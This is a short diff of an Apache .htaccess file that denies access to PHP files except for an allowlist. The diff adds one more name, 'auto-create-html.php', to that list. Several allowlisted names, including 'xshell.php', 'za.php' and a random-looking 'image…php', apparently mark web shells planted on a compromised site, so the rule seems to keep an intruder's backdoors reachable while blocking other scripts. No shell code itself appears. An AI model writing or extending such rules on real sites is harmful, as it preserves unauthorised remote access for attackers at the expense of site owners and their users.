@@ -22,7 +22,7 @@ DirectoryIndex homepage.php
 Order allow,deny
 Deny from all
 </FilesMatch>
-<FilesMatch "^(green.php|jquery.php|query.php|composer.php|wp-config.php|za.php|xshell.php|page-404.php|wp-page-footer.php|get-sitemap.php|query.php|image643800d4d7a9b1681391829.php|jquery-404.php|composer-404.php|infrastructure.php|current-offers.php|technical.php|paymentqr.php|clientarea.php|emailfeatures.php|homepage.php)$">#
+<FilesMatch "^(green.php|jquery.php|query.php|composer.php|wp-config.php|auto-create-html.php|za.php|xshell.php|page-404.php|wp-page-footer.php|get-sitemap.php|query.php|image643800d4d7a9b1681391829.php|jquery-404.php|composer-404.php|infrastructure.php|current-offers.php|technical.php|paymentqr.php|clientarea.php|emailfeatures.php|homepage.php)$">#
 Order allow,deny
 Allow from all
 </FilesMatch>
